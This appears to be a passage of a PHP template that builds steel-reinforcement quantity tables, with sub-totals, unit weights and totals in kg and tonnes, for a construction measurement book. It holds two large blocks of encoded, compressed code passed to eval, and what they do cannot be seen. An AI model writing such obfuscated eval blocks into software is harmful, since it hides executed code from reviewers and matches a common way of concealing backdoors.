				$tot_8 = "";$tot_10 = "";$tot_12 = "";$tot_16 = "";$tot_20 = "";$tot_25 = "";$tot_28 = "";$tot_32 = "";$tot_36 = "";
                $tot8 = "";$tot10 = "";$tot12 = ""; $tot16 = ""; $tot20 = ""; $tot25 = ""; $tot28 = ""; $tot32 = "";$tot36 = ""; $totc = "";
				$txtboxid++;
                } //echo $currentline;
                            $tmb2 = $sumst;
                             $explodedval2 = explode("@",$tmb2); 
                             for($i=0;$i<count($explodedval2);$i++)
                             {
                                 if($explodedval2[$i] != "")
                                 {
                                 $expval2 = explode("*",$explodedval2[$i]); 
                                 if($expval2[0] == 8){ $tot8 = $tot8 + $expval2[1]; }
                                 if($expval2[0] == 10){ $tot10 = $tot10 + $expval2[1]; }
                                 if($expval2[0] == 12){ $tot12 = $tot12 + $expval2[1]; }
                                 if($expval2[0] == 16){ $tot16 = $tot16 + $expval2[1]; }
                                 if($expval2[0] == 20){ $tot20 = $tot20 + $expval2[1]; }
                                 if($expval2[0] == 25){ $tot25 = $tot25 + $expval2[1]; }
                                 if($expval2[0] == 28){ $tot28 = $tot28 + $expval2[1]; }
                                 if($expval2[0] == 32){ $tot32 = $tot32 + $expval2[1]; }
								 if($expval2[0] == 36){ $tot36 = $tot36 + $expval2[1]; }
                                 }
                             }//echo $mpage;exit;
                ?>
                <!---   THIS IS FOR LAST ROW TOTAL IN WHILE LOOP -->
				<?php 
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				if($prev_sub_type == 'c')
				{
				$summary2  .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.","."".",".$prevsubdivid.",".$prevdivid.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$prev_decimal.",".$CouplerTotal.",".$prev_sub_type."@";
				}
				else
				{
				$summary2  .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.",".$totalweight_MT.",".$prevsubdivid.",".$prevdivid.",".$tot8.",".$tot10.",".$tot12.",".$tot16.",".$tot20.",".$tot25.",".$tot28.",".$tot32.",".$tot36.",".$txtboxid.",".$prev_decimal.","."".",".""."@";
				}
				$currentline++;
				//if($currentline>38){ echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1); $currentline = 0;$currentline = $start_line + 11;$mpage++;}
				if($_SESSION['last_row_check'] == 1)
				{
				?>
				<tr height=''>
                    <td width='' colspan="4" class='labelbold' style='text-align:right'><?php echo "B/f from Page ".$page_check_last_row."/ Steel MB No.".$prevmbookno."";  ?></td>
                    <td width='' class='labelbold' style="text-align:right"></td>
					<td width='' class='labelbold' style="text-align:right"><?php echo $CouplerTotal; ?></td>
					<td width='' class='labelbold' style="text-align:right"></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'><?php //echo $mpage; ?></td>-->
                </tr>	
				<?php
				}
				?>
                <tr height=''>
                    <td width='' colspan="4" class='labelcenter' style='text-align:right'>
					<input type="text" style="width:100%" name="txt_pageid" readonly="" id="txt_pageid<?php echo $txtboxid; ?>" class="textboxcobf" />
					</td>
                   	<td width='' class='labelbold'></td>
					<td width='' class='labelbold' style="text-align:right"><?php echo $CouplerTotal; ?></td>
                    <td width='' class='labelbold' bgcolor=""></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				
				<tr height='' style="border:none;" class="label" align="right"><td colspan="16" style="border:none;"><br/><?php //echo $staffname." - ".$designation; ?>&nbsp;&nbsp;</td></tr>
				<tr height='' style="border:none;" class="label" align="right">
				<td colspan="5" style="border:none;">&nbsp;&nbsp;</td>
				<td colspan="6" style="border:none;">Prepared By&nbsp;&nbsp;</td>
				<td colspan="5" style="border:none;">Checked By&nbsp;&nbsp;</td>
				</tr>
				
                </tr>
                <?php
				$currentline+=3;
				/*if($currentline>32)
				{
					//echo check_line($currentline,$tablehead);
					$currentline = 0;
					$currentline = $start_line + 10;
					$mpage++;
				}*/
                
		//if($currentline>38){ echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1); $currentline = 0;$currentline = $start_line + 11;$mpage++;}
 		echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
			/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
			if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }

?>
	<tr height='25px' bgcolor=""><td colspan="16" align="center" class="labelbold labelheadblue" ><?php echo "Summary"; ?></td></tr>
<?php
                $summary = $summary1.$summary2;
               //echo $summary."<br/>";
                $explodsummary = explode("@",$summary);
                natsort($explodsummary);
                foreach($explodsummary as $key => $summ)
                {
                    if($summ != "")
                    {
                        $res_summ .= $summ.",";
                    }
                }
               //echo $res_summ."<br/>";
                $result_summary = explode(",",$res_summ);
               //echo $result_summary."<br/>";
                $preVal = "";$x = 0;
               // while($x < count($result_summary))
			   $subtotal_8 = 0;$subtotal_10 = 0;$subtotal_12 = 0;$subtotal_16 = 0;$subtotal_20 = 0;$subtotal_25 = 0;$subtotal_28 = 0;$subtotal_32 = 0;$subtotal_36 = 0;$count = 0;
			   $pre_subdivname = ""; $temp_var = "";$pre_subdivid = ""; $summary_total = 0; $total_couplar_no = 0;
                for($x=0;$x < count($result_summary)-1;$x+=20)
                {
				
					if($mpage > 100)
					{
						/*if($_GET['varid'] == 1)
						{
							
							
							?>
							<div id="dialog" class="dialogwindow" title="Choose MBook No." style=" background-color:#f9f8f6;font-size: 12px;">
							<p style="font-size:12px; font-weight:bold; color:#911200;">Select Next MBook Number</p>
							<select id="newmbooklist" name="mb" style="width:275px;">
							<option value="">---------------------Select--------------------</option>
							<?php echo $objBind->BindMBookList($mbookno,$sheetid,$staffid,$mbooktype); ?>
							</select>
							<br/>
							<span id="error_msg" style="color:#FF0000; font-weight:bold;"></span>
							<input type="button" class="submit_btn" id="btn" style="color:#FFFFFF;background-color:#9c27b0;border:none;" name="btn" value="Submit"/>
							<input type="button" class="cancel_btn" id="btn_cancel" style="color:#FFFFFF;background-color:#e51c23;border:none;" name="btn_cancel" value="Cancel"/>
							</div>
							<?php
						}
						$currentline = $start_line + 13;
						$prevpage = 100;
						$mpage = $newmbookpage;
						//$prevpage = $mpage;
						$mbookno = $newmbookno;*/
					}
					/*if($currentline>32)
					{
						
						$currentline = 0;
						$currentline = $start_line + 10;
						$mpage++;
					}*/
					
                  	$x1=$x+1; $x2=$x+2; $x3=$x+3; $x4=$x+4; $x5=$x+5; $x6=$x+6; $x7=$x+7; $x8=$x+8; $x9=$x+9; $x10=$x+10; $x11=$x+11; $x12=$x+12; $x13=$x+13; $x14=$x+14; $x15=$x+15;$x16=$x+16;$x17=$x+17;$x18=$x+18;$x19=$x+19;
					
					$sum_meas_no 	= $result_summary[$x18];
					$sum_sub_type 	= $result_summary[$x19];
					
						if($result_summary[$x] != $pre_subdivname)
						{
							if($pre_subdivname != "")
							{
								$count++;
								if($prev_sum_sub_type == 'c')
								{
					?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelheadblue'>Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php echo $total_couplar_no; ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">each</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
				<!--<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="3" class='labelcenter labelheadblue'>Total</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $total_couplar_no." each"; ?></td>
                </tr>-->
					<?php		
								$currentline = $currentline+1;	
								$totalweight_MT = $total_couplar_no;
								$total_couplar_no = 0;	
								}
								else
								{
							?>
				
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelheadblue'>Sub Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_8 != 0) { echo number_format($subtotal_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr>
					<td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="7" align="right" class='label labelheadblue'>C/o to page /MBook No.</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter'></td>
				</tr>-->
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Unit Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right">0.395</td>
                    <td width='' class='labelcenter' style="text-align:right">0.617</td>
                    <td width='' class='labelcenter' style="text-align:right">0.888</td>
                    <td width='' class='labelcenter' style="text-align:right">1.578</td>
                    <td width='' class='labelcenter' style="text-align:right">2.466</td>
                    <td width='' class='labelcenter' style="text-align:right">3.853</td>
                    <td width='' class='labelcenter' style="text-align:right">4.834</td>
                    <td width='' class='labelcenter' style="text-align:right">6.313</td>
					<td width='' class='labelcenter' style="text-align:right">7.990</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
							<?php
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Total Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_8 != 0) { echo $total_8; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_10 != 0) { echo $total_10; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_12 != 0) { echo $total_12; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_16 != 0) { echo $total_16; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_20 != 0) { echo $total_20; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_25 != 0) { echo $total_25; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_28 != 0) { echo $total_28; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_32 != 0) { echo $total_32; } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($total_36 != 0) { echo $total_36; } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter'>Total in kg</td>
                   <td width='' colspan="10" class='labelcenter'><?php echo $totalweight_KGS." kg"; ?></td>
                   <!--<td width='' class='labelcenter'></td>-->
				   
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="4" class='labelcenter labelheadblue'>Total in mt</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $totalweight_MT." mt"; ?></td>
                   <!--<td width='' class='labelcenter'></td>-->
				   
                </tr>
				<?php
				$currentline = $currentline+5;
									}
				if($currentline>30){ 
				echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
				/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
				if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				
				//$summary_str1 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$pre_mbookno.",".$mpage.",";
				$summary_str1 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$mbookno.",".$mpage.",";
				$subtotal_8 = 0;$subtotal_10 = 0;$subtotal_12 = 0;$subtotal_16 = 0;$subtotal_20 = 0;$subtotal_25 = 0;$subtotal_28 = 0;$subtotal_32 = 0;$subtotal_36 = 0;
							}
							 //$subtotal_8 = 0;
						}
						?>
							
				<tr height=''>
                    <td width='8%' class='labelcenter'><?php echo $result_summary[$x1]; ?></td>
                    <td width='4%' class='labelcenter' bgcolor=""><?php echo $result_summary[$x]; ?></td>
                    <td width='15%' class='labelcenter' colspan="4"><?php echo "Qty vide B/f MB-".$result_summary[$x3]."/ Page-".$result_summary[$x2];  ?></td>
                    <td width='4%' class='labelcenter'><?php echo "&nbsp;";  ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right">
					<?php 
					if($sum_sub_type == 'c'){
						echo $sum_meas_no; 
					}else{
						echo number_format($result_summary[$x7],$result_summary[$x17],".",","); 
					}
					?>
					</td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x8],$result_summary[$x17],".",","); ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x9],$result_summary[$x17],".",","); ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x10],$result_summary[$x17],".",","); ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x11],$result_summary[$x17],".",","); ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x12],$result_summary[$x17],".",","); ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x13],$result_summary[$x17],".",","); ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x14],$result_summary[$x17],".",","); ?></td>
					<td width='6%' class='labelcenter' style="text-align:right"><?php echo number_format($result_summary[$x15],$result_summary[$x17],".",","); ?></td>
                    <!--<td width='2%' class='labelcenter'></td>-->
                </tr>

                                    <?php
